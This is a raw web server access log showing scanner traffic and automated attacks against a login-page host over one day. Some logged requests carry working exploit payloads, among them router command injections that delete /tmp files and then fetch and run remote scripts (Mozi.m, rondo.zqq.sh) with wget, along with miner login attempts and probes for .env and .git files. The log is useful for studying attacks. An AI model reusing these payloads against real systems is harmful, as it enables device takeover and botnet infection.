164.52.24.188 - - [19/Aug/2025:03:32:47 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x033\x02\xB3/\x04v\x0C\x81ss\x96;" 400 166 "-" "-"
164.52.24.188 - - [19/Aug/2025:03:32:47 +0000] "GET / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
3.131.215.38 - - [19/Aug/2025:03:32:49 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
164.52.24.188 - - [19/Aug/2025:03:32:50 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [19/Aug/2025:03:32:53 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
164.52.24.188 - - [19/Aug/2025:03:32:56 +0000] "GET /favicon.ico HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [19/Aug/2025:03:33:00 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
3.131.215.38 - - [19/Aug/2025:03:34:49 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF7\x05e|st\xF9n\xBAZ\xA9k+\xD0<\x1D\x82\x1E\xDC\xF35\x1Ab\xD1c0\x0E\xA0\xFC\x89\xAA\xDF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
3.131.215.38 - - [19/Aug/2025:03:35:00 +0000] "SSH-2.0-Go" 400 166 "-" "-"
3.131.215.38 - - [19/Aug/2025:03:35:04 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD4`\xA1W\xEB\xE4\xA8\xEB\xEE\x1D\xBF\xC9\xA3V\xEA)\xA1\xC8\x0Bv\xFA\xE6\x17\xF1\xB9\xAF\x05G:\xD2f\x1D\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
3.131.215.38 - - [19/Aug/2025:03:37:46 +0000] "" 400 0 "-" "-"
87.121.84.45 - - [19/Aug/2025:03:46:10 +0000] "GET / HTTP/1.0" 404 162 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
45.79.172.21 - - [19/Aug/2025:03:48:54 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
45.79.172.21 - - [19/Aug/2025:03:48:54 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
205.210.31.92 - - [19/Aug/2025:03:49:41 +0000] "GET / HTTP/1.1" 404 134 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
142.214.203.108 - - [19/Aug/2025:03:49:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:03:49:49 +0000] "" 400 0 "-" "-"
104.234.115.34 - - [19/Aug/2025:03:57:25 +0000] "GET / HTTP/1.0" 301 178 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:00:15 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1F\xD8U$\xBA\x93\xE1\x11\x84ADQ{\xB5<\x7F;\x15)\x92\xD5Uw\x9A\xCB\x1F[\x08\xDF\x1Cr\xAF \xD3\xC6\x86q\x91_\xD5\xFA\xBD0\x87" 400 166 "-" "-"
104.234.115.34 - - [19/Aug/2025:04:06:21 +0000] "GET / HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
185.242.226.124 - - [19/Aug/2025:04:09:28 +0000] "GET / HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
104.234.115.34 - - [19/Aug/2025:04:10:22 +0000] "GET /manage/account/login HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:13:36 +0000] "GET /admin/index.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:17:09 +0000] "GET /index.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
103.98.38.65 - - [19/Aug/2025:04:21:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
104.234.115.34 - - [19/Aug/2025:04:22:28 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:27:46 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:32:43 +0000] "GET /login.htm HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
91.224.92.17 - - [19/Aug/2025:04:35:39 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
104.234.115.34 - - [19/Aug/2025:04:37:48 +0000] "GET /login.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
196.251.87.12 - - [19/Aug/2025:04:38:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3191.0 Safari/537.36"
64.62.197.107 - - [19/Aug/2025:04:41:57 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
104.234.115.34 - - [19/Aug/2025:04:43:18 +0000] "GET /login.jsp HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
64.62.197.107 - - [19/Aug/2025:04:43:44 +0000] "GET /webui/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
64.62.197.118 - - [19/Aug/2025:04:45:18 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
64.62.197.107 - - [19/Aug/2025:04:45:47 +0000] "GET /geoserver/web/ HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
104.234.115.34 - - [19/Aug/2025:04:50:56 +0000] "GET /login HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:04:55:37 +0000] "GET /doc/index.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
91.224.92.17 - - [19/Aug/2025:05:03:48 +0000] "GET / HTTP/1.1" 404 0 "-" "-"
142.214.203.108 - - [19/Aug/2025:05:04:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:05:04:03 +0000] "" 400 0 "-" "-"
104.234.115.34 - - [19/Aug/2025:05:04:14 +0000] "GET /remote/login HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
45.153.34.225 - - [19/Aug/2025:05:04:21 +0000] "PUT /SDK/webLanguage HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.153.34.225 - - [19/Aug/2025:05:04:21 +0000] "" 400 0 "-" "-"
104.234.115.34 - - [19/Aug/2025:05:10:59 +0000] "GET //admin/login.asp HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:05:18:14 +0000] "GET /web/ HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.34 - - [19/Aug/2025:05:18:56 +0000] "GET //webpages/login.html HTTP/1.1" 404 134 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
45.156.87.165 - admin [19/Aug/2025:05:32:22 +0000] "POST /cn/cmd HTTP/1.1" 404 162 "-" "Mozilla/5.0 (bang2012@protonmail.com)"
147.185.132.137 - - [19/Aug/2025:05:40:50 +0000] "GET / HTTP/1.1" 404 134 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
172.104.11.4 - - [19/Aug/2025:05:46:38 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
172.104.11.4 - - [19/Aug/2025:05:48:31 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
91.224.92.17 - - [19/Aug/2025:05:59:33 +0000] "GET / HTTP/1.1" 404 0 "-" "-"
78.153.140.149 - - [19/Aug/2025:07:00:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.94.138.125 - - [19/Aug/2025:07:04:16 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
185.91.69.5 - - [19/Aug/2025:07:07:01 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xF6Z\xEC\x22\x82\xA7\x1Fw\xB7\x05\x0B\x96\x8E\xC3+i\x22\xE7\xFF\xB5\x11h\xCF\xBC\x0F\x12\xB1,|o\x84\xB5 \x05i\xA4\x8A\xDD\xBE\xF6\x10\xB3Cp\xFA\xC7<w'\xDC\xFD\xC3\xA6e\xC2\xEC\x07JiU\x84\xC07\x1A\xF8\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x01\x8F\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 166 "-" "-"
167.94.138.125 - - [19/Aug/2025:07:10:33 +0000] "\x08\x00\x86\x01" 400 0 "-" "-"
185.91.69.5 - - [19/Aug/2025:07:10:33 +0000] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22cpuminer/2.5.1\x22]}" 400 166 "-" "-"
142.214.203.108 - - [19/Aug/2025:06:40:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:06:40:42 +0000] "" 400 0 "-" "-"
167.94.138.125 - - [19/Aug/2025:07:14:49 +0000] "\x00\xAB\x03$\x0F\xFF\xFFinfo" 400 0 "-" "-"
185.91.69.5 - - [19/Aug/2025:07:14:49 +0000] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22MinerName/1.0.0\x22, \x22EthereumStratum/1.0.0\x22]}" 400 166 "-" "-"
167.94.138.125 - - [19/Aug/2025:07:17:24 +0000] "\x00\x0E\x08\xFD\xEA\xD4u\x1D\xA9\x08I\x00\x00\x00\x00\x00" 400 0 "-" "-"
45.156.87.165 - - [19/Aug/2025:07:15:55 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (bang2012@protonmail.com)"
185.91.69.5 - - [19/Aug/2025:07:17:24 +0000] "{\x22id\x22:1,\x22method\x22:\x22eth_submitLogin\x22,\x22worker\x22:\x22igwrcvap\x22,\x22params\x22:[\x220x45bd5bea729fe068b7eb17896c7516c9c2071386\x22,\x22x\x22],\x22jsonrpc\x22:\x222.0\x22}" 400 166 "-" "-"
167.94.138.125 - - [19/Aug/2025:07:18:55 +0000] "\x00\x0E8\xFD\xEA\xD4u\x1D\xA9\x08I\x00\x00\x00\x00\x00" 400 0 "-" "-"
185.91.69.5 - - [19/Aug/2025:07:18:55 +0000] "{\x22id\x22:1,\x22jsonrpc\x22:\x222.0\x22,\x22method\x22:\x22login\x22,\x22params\x22:{\x22login\x22:\x2243K5xjYD8mvMax8XnkULtsUmDhqFiN1drdrcUSt42vUkDpP2mZVgPEA4JtSUKXzHnz76u8aXF6uwH4YfMWMyYJSU2PzLzgQ\x22,\x22pass\x22:\x22x\x22,\x22agent\x22:\x22XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\x22,\x22algo\x22:[\x22cn/1\x22,\x22cn/2\x22,\x22cn/r\x22,\x22cn/fast\x22,\x22cn/half\x22,\x22cn/xao\x22,\x22cn/rto\x22,\x22cn/rwz\x22,\x22cn/zls\x22,\x22cn/double\x22,\x22cn/ccx\x22,\x22cn-lite/1\x22,\x22cn-heavy/0\x22,\x22cn-heavy/tube\x22,\x22cn-heavy/xhv\x22,\x22cn-pico\x22,\x22cn-pico/tlo\x22,\x22cn/upx2\x22,\x22rx/0\x22,\x22rx/wow\x22,\x22rx/arq\x22,\x22rx/graft\x22,\x22rx/sfx\x22,\x22rx/keva\x22,\x22argon2/chukwa\x22,\x22argon2/chukwav2\x22,\x22argon2/ninja\x22,\x22astrobwt\x22]}}" 400 166 "-" "-"
64.225.101.76 - - [19/Aug/2025:07:21:08 +0000] "GET / HTTP/1.1" 400 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
185.91.69.5 - 1HNLK6GFGBeCqnCrUY97rgmVbmiQxRX6kZ [19/Aug/2025:07:21:08 +0000] "POST / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
205.210.31.155 - - [19/Aug/2025:07:23:57 +0000] "GET / HTTP/1.0" 301 0 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
185.91.69.5 - - [19/Aug/2025:07:20:17 +0000] "GET / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
196.251.81.194 - - [19/Aug/2025:07:36:05 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.1.2; FP2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3888.0 Mobile Safari/537.36"
162.142.125.37 - - [19/Aug/2025:08:16:54 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.91.69.5 - - [19/Aug/2025:07:39:59 +0000] "\x08\x00\x00\x00arch=x64\x15\x00\x00\x00pipename=msagent_e8c2" 400 166 "-" "-"
162.142.125.37 - - [19/Aug/2025:08:48:45 +0000] "\x00\x0E\x08?\x846\xF1\xE6\xA7<|\x00\x00\x00\x00\x00" 400 0 "-" "-"
91.224.92.17 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 0 "-" "-"
162.142.125.37 - - [19/Aug/2025:08:48:45 +0000] "\x00\x0E8?\x846\xF1\xE6\xA7<|\x00\x00\x00\x00\x00" 400 0 "-" "-"
45.82.78.114 - - [19/Aug/2025:08:48:45 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
167.94.138.204 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.123 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.76 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
134.209.158.48 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
185.91.127.107 - - [19/Aug/2025:08:48:45 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 400 166 "-" "-"
93.174.93.12 - - [19/Aug/2025:08:48:45 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 0 "-" "-"
91.224.92.17 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
88.210.63.22 - - [19/Aug/2025:08:48:45 +0000] "GET /remote/login HTTP/1.0" 400 666 "https://www.google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
119.40.84.133 - - [19/Aug/2025:08:48:45 +0000] "GET /phpMyAdmin-5.2.1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
88.210.63.22 - - [19/Aug/2025:08:48:45 +0000] "GET /login?redir= HTTP/1.0" 400 666 "https://www.google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
167.71.49.69 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
185.177.72.12 - - [19/Aug/2025:08:48:45 +0000] "GET /.git/HEAD HTTP/1.1" 404 134 "-" "-"
185.177.72.12 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
142.214.203.108 - - [19/Aug/2025:08:48:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
3.134.148.59 - - [19/Aug/2025:08:48:45 +0000] "GET / HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
142.214.203.108 - - [19/Aug/2025:08:48:45 +0000] "" 400 0 "-" "-"
3.134.148.59 - - [19/Aug/2025:08:48:45 +0000] "" 400 0 "-" "-"
3.134.148.59 - - [19/Aug/2025:08:48:45 +0000] "SSH-2.0-Go" 400 166 "-" "-"
20.46.245.69 - - [19/Aug/2025:08:48:45 +0000] "MGLNDD_20.98.153.223_443" 400 166 "-" "-"
45.156.87.165 - - [19/Aug/2025:08:48:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (bang2012@protonmail.com)"
142.214.203.108 - - [19/Aug/2025:08:48:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:08:48:45 +0000] "" 400 0 "-" "-"
91.224.92.17 - - [19/Aug/2025:08:51:54 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
87.236.176.216 - - [19/Aug/2025:08:53:36 +0000] "GET / HTTP/1.1" 200 601 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.185 - - [19/Aug/2025:08:53:37 +0000] "GET /favicon-16x16.png HTTP/1.1" 200 14906 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.119 - - [19/Aug/2025:08:53:37 +0000] "GET /favicon-96x96.png HTTP/1.1" 200 17029 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.246 - - [19/Aug/2025:08:53:37 +0000] "GET /favicon-32x32.png HTTP/1.1" 200 16066 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.86 - - [19/Aug/2025:08:53:37 +0000] "GET /apple-icon-180x180.png HTTP/1.1" 200 21356 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
20.245.212.151 - - [19/Aug/2025:09:12:44 +0000] "GET / HTTP/1.1" 400 264 "-" "mrtscan/1.0 (westus)"
71.6.199.65 - - [19/Aug/2025:09:34:34 +0000] "GET / HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
142.214.203.108 - - [19/Aug/2025:10:12:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:10:12:12 +0000] "" 400 0 "-" "-"
205.210.31.153 - - [19/Aug/2025:10:21:13 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03e<G\x05\xB8a0\xFD\xAA\x97\xDF\xED#\x19+\xA3\x16\x03U\x0BjV\xD3\x9A\xBC\xF9\xF2\xAB\xD9T\x5C\x04 \xD2\x97\xC3\xA4\xA4y\x5C~\xBC\xF2\x824Y\xC0\x08\x96:>\xA4r\xDB\x1B\x7F\xDC7\x1E\x01\xE7m\x958\x04\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
27.34.66.100 - - [19/Aug/2025:10:26:14 +0000] "GET / HTTP/1.1" 404 0 "-" "curl/8.14.1"
205.210.31.153 - - [19/Aug/2025:10:26:22 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xE3\xB9\xF9W\x96+\x05=\xE5R\x94\x08#\x8D\xC5\xD5\xEC\x17\x8BFA]\xB7\x11b\x82\xB8\x81\xE9\xDD\xB6\xF3\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
91.224.92.17 - - [19/Aug/2025:10:26:22 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
142.214.203.108 - - [19/Aug/2025:10:26:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.98.153.223:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
142.214.203.108 - - [19/Aug/2025:10:26:22 +0000] "" 400 0 "-" "-"
91.224.92.17 - - [19/Aug/2025:10:26:22 +0000] "GET / HTTP/1.1" 404 0 "-" "-"
87.121.84.45 - - [19/Aug/2025:10:26:22 +0000] "GET / HTTP/1.0" 404 162 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
113.199.228.199 - - [19/Aug/2025:10:29:18 +0000] "GET /login HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:18 +0000] "GET /styles/root-styles.css HTTP/1.1" 200 336 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:18 +0000] "GET /static/css/main.e60e4760.css HTTP/1.1" 200 1427 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:18 +0000] "GET /images/background.svg HTTP/1.1" 200 586 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:19 +0000] "GET /Loader.svg HTTP/1.1" 200 18052 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:19 +0000] "GET /images/background-wave-orig2.svg HTTP/1.1" 200 663820 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:20 +0000] "GET /static/js/main.66e95f79.js HTTP/1.1" 200 2404787 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:22 +0000] "GET /static/media/Inter-Light.2d5198822ab091ce4305.woff2 HTTP/1.1" 200 104332 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:22 +0000] "GET /favicon-32x32.png HTTP/1.1" 200 16066 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
113.199.228.199 - - [19/Aug/2025:10:29:22 +0000] "GET /static/media/Inter-Regular.c8ba52b05a9ef10f4758.woff2 HTTP/1.1" 200 98868 "https://nninesolution.ddns.net/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
